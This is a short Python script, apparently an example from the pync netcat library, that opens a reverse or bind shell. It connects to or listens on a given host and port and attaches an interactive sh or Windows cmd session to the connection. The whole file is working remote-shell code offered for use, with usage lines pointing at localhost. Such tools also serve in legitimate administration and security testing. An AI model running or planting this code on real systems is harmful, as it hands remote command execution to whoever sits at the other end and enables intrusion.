# -*- coding: utf-8 -*-
'''
A simple reverse or bind shell using pync.

example bind shell:
    shell.py -l localhost 8000

example reverse shell:
    shell.py localhost 8000
'''

import argparse
import contextlib
import platform

from pync import Netcat


def main():
    parser = argparse.ArgumentParser('shell.py',
            formatter_class=argparse.RawTextHelpFormatter,
            description=__doc__,
    )
    parser.add_argument('dest',
            help='Hostname or IP to connect or bind to',
            metavar='DEST',
            nargs='?',
            default='',
    )
    parser.add_argument('port',
            help='Port number to connect to',
            metavar='PORT',
            type=int,
    )
    parser.add_argument('-l',
            help='Listen mode, for bind shell',
            action='store_true',
    )
    args = parser.parse_args()

    command = "PS1='$ ' sh -i"
    if platform.system() == 'Windows':
        command = 'cmd /q'

    nc = Netcat(
            dest=args.dest,
            port=args.port,
            e=command,       # Execute a command upon connection.
            l=args.l,        # Listen for connections (server mode).
            v=True,          # Print connection status messages to stderr.
    )
    with contextlib.closing(nc):
        nc.readwrite()


if __name__ == '__main__':
    main()

